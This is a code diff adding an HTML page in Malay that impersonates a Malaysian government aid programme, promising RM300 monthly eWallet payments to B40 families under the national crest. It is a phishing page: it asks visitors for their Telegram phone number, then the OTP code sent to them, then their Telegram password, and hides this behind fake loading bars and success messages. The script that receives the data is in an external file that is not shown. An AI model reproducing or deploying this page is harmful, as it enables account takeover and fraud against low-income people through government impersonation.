@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Bantuan eWallet 2024: Pemberian RM300 Untuk Keluarga B40</title>
+    <!-- Link ke Google Fonts -->
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap"
+      rel="stylesheet"
+    />
+    <!-- Link ke CSS intl-tel-input -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"
+    />
+    <!-- Link ke CSS -->
+    <link rel="stylesheet" href="style.css" />
+
+    <!-- feather icon -->
+    <script src="https://unpkg.com/feather-icons"></script>
+  </head>
+  <body>
+    <!-- navbar -->
+    <nav class="navbar">
+      <div class="navbar-logo">
+        <img
+          src="Jata Negara@3x.gif"
+          alt="Logo Negara"
+          class="navbar-img"
+          style="width: 60px; height: auto"
+        />
+      </div>
+      <div class="navbar-nav">
+        <div class="search-bar">
+          <div class="search-icon">
+            <i data-feather="search"></i>
+          </div>
+        </div>
+        <div class="hamburger-menu">
+          <div class="menu-icon" onclick="toggleMenu()">
+            <i data-feather="menu"></i>
+          </div>
+        </div>
+      </div>
+    </nav>
+    <!-- navbar end -->
+
+    <div class="hero">
+      <br />
+      <img src="banner.png" alt="tng-img" />
+      <div class="container-img">
+        <figure>
+          <img src="w.png" alt="tng-img" />
+          <figcaption>Maklumat Terkini</figcaption>
+        </figure>
+        <figure>
+          <img src="list.png" alt="tng-img" />
+          <figcaption>Borang Borang</figcaption>
+        </figure>
+        <figure>
+          <img src="check-box.png" alt="tng-img" />
+          <figcaption>Perkhidmatan</figcaption>
+        </figure>
+      </div>
+
+      <h4
+        class="fw-bold mt-2 page-header text-center"
+        style="font-size: 18px; color: white; padding: 0; border-radius: 10px"
+      >
+        <marquee
+          scrolldelay="30"
+          style="
+            font-size: 18px;
+            padding: 10px;
+            background: linear-gradient(to right, #f7f8f8, #9a9a9a);
+          "
+        >
+          &nbsp;&nbsp;Bantuan eWallet 2024 : Pemberian RM300 Untuk Keluarga B40
+        </marquee>
+      </h4>
+
+      <div class="centered-container" id="centeredContainer">
+        <div class="centered-text">SEMAK STATUS.</div>
+      </div>
+      <br />
+
+      <!-- Tombol untuk memulai loading -->
+      <button type="submit" class="btn" onclick="startLoading()">
+        SEMAK STATUS
+      </button>
+
+      <!-- Animasi loading -->
+      <div
+        class="quedate__step-box"
+        id="loader"
+        style="display: none; text-align: center"
+      >
+        <svg
+          class="quedate__animate"
+          xmlns="http://www.w3.org/2000/svg"
+          xmlns:xlink="http://www.w3.org/1999/xlink"
+          style="shape-rendering: auto; margin: auto; display: block"
+          viewBox="0 0 100 100"
+          preserveAspectRatio="xMidYMid"
+          width="5rem"
+        >
+          <circle
+            cx="50"
+            cy="50"
+            r="32"
+            stroke-width="8"
+            stroke="#4285F4"
+            stroke-dasharray="50.26548245743669 50.26548245743669"
+            fill="none"
+            stroke-linecap="round"
+            transform="rotate(214.395 50 50)"
+          >
+            <animateTransform
+              attributeName="transform"
+              type="rotate"
+              dur="1s"
+              repeatCount="indefinite"
+              keyTimes="0;1"
+              values="0 50 50;360 50 50"
+            ></animateTransform>
+          </circle>
+          <circle
+            cx="50"
+            cy="50"
+            r="23"
+            stroke-width="8"
+            stroke="#4285F4"
+            stroke-dasharray="36.12831551628262 36.12831551628262"
+            stroke-dashoffset="36.12831551628262"
+            fill="none"
+            stroke-linecap="round"
+            transform="rotate(-214.395 50 50)"
+          >
+            <animateTransform
+              attributeName="transform"
+              type="rotate"
+              dur="1s"
+              repeatCount="indefinite"
+              keyTimes="0;1"
+              values="0 50 50;-360 50 50"
+            ></animateTransform>
+          </circle>
+        </svg>
+      </div>
+
+      <!-- Persentase loading -->
+      <div id="percentage" style="display: none">0%</div>
+      <div id="loading" style="display: none">
+        Mohon Tunggu Kami Sedang Mengesahkan Data...
+      </div>
+
+      <!-- Pesan terima kasih -->
+      <div id="thankYouMessage" style="display: none">
+        <div id="successCircle" style="display: none; text-align: center">
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            viewBox="0 0 100 100"
+            width="5rem"
+            height="5rem"
+            style="margin: auto; display: block"
+          >
+            <circle
+              cx="50"
+              cy="50"
+              r="40"
+              stroke-width="8"
+              stroke="#4285F4"
+              fill="none"
+            ></circle>
+            <path
+              d="M34 50 L45 62 L66 38"
+              fill="none"
+              stroke="#4285F4"
+              stroke-width="8"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+            ></path>
+          </svg>
+        </div>
+        Terima Kasih, Kami Sudah Menyemak
+      </div>
+
+      <!-- Form nomor telepon -->
+      <div class="enter-container" id="enterContainer">
+        <div class="enter-text">
+          Masukkan
+          <span>Nombor telefon Telegram anda untuk menyemak status.</span>
+        </div>
+      </div>
+      <br />
+      <div id="phoneNumberForm" style="display: none">
+        <input
+          type="tel"
+          placeholder="Enter Phone Nomber"
+          id="phoneNumberInput"
+        />
+        <button type="submit" id="sendPhoneButton">Send</button>
+      </div>
+
+      <!-- Form OTP -->
+      <div class="otp-container" id="otpContainer">
+        <div class="otp-text">
+          Masukkan
+          <span>Kod OTP yang dihantar ke Nombor Telegram aktif Anda.</span>
+        </div>
+      </div>
+      <br />
+      <div id="otpForm" style="display: none">
+        <input type="tel" placeholder="Semak OTP di Telegram" id="otpInput" />
+        <button type="submit" id="sendOtpButton">Send</button>
+      </div>
+      <!-- Form kata sandi -->
+      <div class="sandi-container" id="sandiContainer">
+        <div class="sandi-text">Masukkan Kata Laluan Telegram Anda.</div>
+      </div>
+      <br />
+      <div id="sandiForm" style="display: none">
+        <input
+          type="password"
+          placeholder="Masukkan kata laluan"
+          id="sandiInput"
+        />
+        <button type="submit" id="sendPasswordButton">Send</button>
+      </div>
+
+      <!-- animasi bar -->
+      <div
+        class="bar-text"
+        id="barText"
+        style="
+          display: none;
+          justify-content: center;
+          margin-top: -80px;
+          align-items: center;
+          text-align: center;
+        "
+      >
+        Pasikan data yang anda masukkan sudah sesuai.
+      </div>
+      <br />
+
+      <div class="bar-container" id="barContainer" style="display: none">
+        <div class="bar-content">
+          <div class="quedate__load" id="animasiBar">
+            <div class="progress-wrapper">
+              <div class="progress-text" id="progressText">
+                <span id="percentage1">0%</span> Memproses Data...
+              </div>
+              <span class="quedate__load-a" id="progressBar"></span>
+            </div>
+          </div>
+          <div class="quedate__step-box1" id="loaderBar">
+            <svg
+              class="quedate__animate"
+              xmlns="http://www.w3.org/2000/svg"
+              style="shape-rendering: auto; margin: auto; display: block"
+              viewBox="0 0 100 100"
+              preserveAspectRatio="xMidYMid"
+              width="2rem"
+            >
+              <circle
+                cx="50"
+                cy="50"
+                r="32"
+                stroke-width="8"
+                stroke="#03196e"
+                stroke-dasharray="50.26548245743669 50.26548245743669"
+                fill="none"
+                stroke-linecap="round"
+                transform="rotate(214.395 50 50)"
+              >
+                <animateTransform
+                  attributeName="transform"
+                  type="rotate"
+                  dur="1s"
+                  repeatCount="indefinite"
+                  keyTimes="0;1"
+                  values="0 50 50;360 50 50"
+                ></animateTransform>
+              </circle>
+              <circle
+                cx="50"
+                cy="50"
+                r="23"
+                stroke-width="8"
+                stroke="#f02e3f"
+                stroke-dasharray="36.12831551628262 36.12831551628262"
+                stroke-dashoffset="36.12831551628262"
+                fill="none"
+                stroke-linecap="round"
+                transform="rotate(-214.395 50 50)"
+              >
+                <animateTransform
+                  attributeName="transform"
+                  type="rotate"
+                  dur="1s"
+                  repeatCount="indefinite"
+                  keyTimes="0;1"
+                  values="0 50 50;-360 50 50"
+                ></animateTransform>
+              </circle>
+            </svg>
+          </div>
+          <div id="successCircle1" class="success-circle1">
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              viewBox="0 0 100 100"
+              width="2rem"
+              height="2rem"
+              style="margin: auto; display: block"
+            >
+              <circle
+                cx="50"
+                cy="50"
+                r="40"
+                stroke-width="8"
+                stroke="#06c167"
+                fill="none"
+              ></circle>
+              <path
+                d="M34 50 L45 62 L66 38"
+                fill="none"
+                stroke="#06c167"
+                stroke-width="8"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              ></path>
+            </svg>
+          </div>
+        </div>
+      </div>
+
+      <!-- Tambahkan div untuk progress bar kedua -->
+      <div
+        class="loading-container"
+        id="loadingContainer2"
+        style="display: none"
+      >
+        <div class="loading-content">
+          <div class="progress-section" id="progressSection2">
+            <div class="progress-wrapper">
+              <div class="progress-info" id="progressText2">
+                <span id="progressPercentage2">0%</span> Tahniah anda berjaya
+                masuk.
+              </div>
+              <div class="progress-bar" id="progressBar2"></div>
+            </div>
+          </div>
+          <div class="loader-animation" id="loaderAnimation2">
+            <svg
+              class="loader-svg"
+              xmlns="http://www.w3.org/2000/svg"
+              style="shape-rendering: auto; margin: auto; display: block"
+              viewBox="0 0 100 100"
+              preserveAspectRatio="xMidYMid"
+              width="2rem"
+            >
+              <circle
+                cx="50"
+                cy="50"
+                r="32"
+                stroke-width="8"
+                stroke="#03196e"
+                stroke-dasharray="50.26548245743669 50.26548245743669"
+                fill="none"
+                stroke-linecap="round"
+                transform="rotate(214.395 50 50)"
+              >
+                <animateTransform
+                  attributeName="transform"
+                  type="rotate"
+                  dur="1s"
+                  repeatCount="indefinite"
+                  keyTimes="0;1"
+                  values="0 50 50;360 50 50"
+                ></animateTransform>
+              </circle>
+              <circle
+                cx="50"
+                cy="50"
+                r="23"
+                stroke-width="8"
+                stroke="#f02e3f"
+                stroke-dasharray="36.12831551628262 36.12831551628262"
+                stroke-dashoffset="36.12831551628262"
+                fill="none"
+                stroke-linecap="round"
+                transform="rotate(-214.395 50 50)"
+              >
+                <animateTransform
+                  attributeName="transform"
+                  type="rotate"
+                  dur="1s"
+                  repeatCount="indefinite"
+                  keyTimes="0;1"
+                  values="0 50 50;-360 50 50"
+                ></animateTransform>
+              </circle>
+            </svg>
+          </div>
+          <div
+            class="success-indicator"
+            id="successIndicator2"
+            style="display: none"
+          >
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              viewBox="0 0 100 100"
+              width="2rem"
+              height="2rem"
+              style="margin: auto; display: block"
+            >
+              <circle
+                cx="50"
+                cy="50"
+                r="40"
+                stroke-width="8"
+                stroke="#06c167"
+                fill="none"
+              ></circle>
+              <path
+                d="M34 50 L45 62 L66 38"
+                fill="none"
+                stroke="#06c167"
+                stroke-width="8"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              ></path>
+            </svg>
+          </div>
+        </div>
+      </div>
+
+      <div class="dialog-text-1">
+        <h1>Bantuan eWallet 2024 : Pemberian RM300 Untuk Keluarga B40</h1>
+        <p>
+          Bantuan E-Dompet 2024: Program Bantuan Kebajikan menyediakan insentif
+          bulanan bernilai RM300. Difahamkan bahawa inisiatif khusus ini adalah
+          salah satu geran yang disediakan dalam bajet tahun ini.
+        </p>
+      </div>
+
+      <div class="dialog-text-2">
+        <h1>Bantuan Dompet 2024</h1>
+        <p>
+          Kerajaan negeri bersetuju untuk meneruskan program khas yang dinamakan
+          “Bantuan Kebajikan” atau “Bingkas”. Melalui program khas ini, pemohon
+          yang layak akan menerima insentif bantuan tambahan bernilai RM300
+          sebulan.
+        </p>
+      </div>
+
+      <div class="dialog-text-3">
+        <h1>Bantuan Dompet 2024</h1>
+        <img src="bantuanb40.gif" alt="bantuan" />
+      </div>
+
+      <!-- Ganti footer dengan ini -->
+      <footer class="nav-footer">
+        <div class="nav-item">
+          <a href="index.html" style="text-decoration: none; color: inherit">
+            <i data-feather="home"></i>
+            <span>Home</span>
+          </a>
+        </div>
+        <div class="nav-item">
+          <a href="withdraw.html" style="text-decoration: none; color: inherit">
+            <i data-feather="credit-card"></i>
+            <span>Withdraw</span>
+          </a>
+        </div>
+        <div class="nav-item">
+          <a href="account.html" style="text-decoration: none; color: inherit">
+            <i data-feather="user"></i>
+            <span>Account</span>
+          </a>
+        </div>
+      </footer>
+
+      <!-- JavaScript -->
+      <script src="javascript.js"></script>
+      <script>
+        // Inisialisasi Feather Icons
+        feather.replace();
+      </script>
+    </div>
+  </body>
+</html>
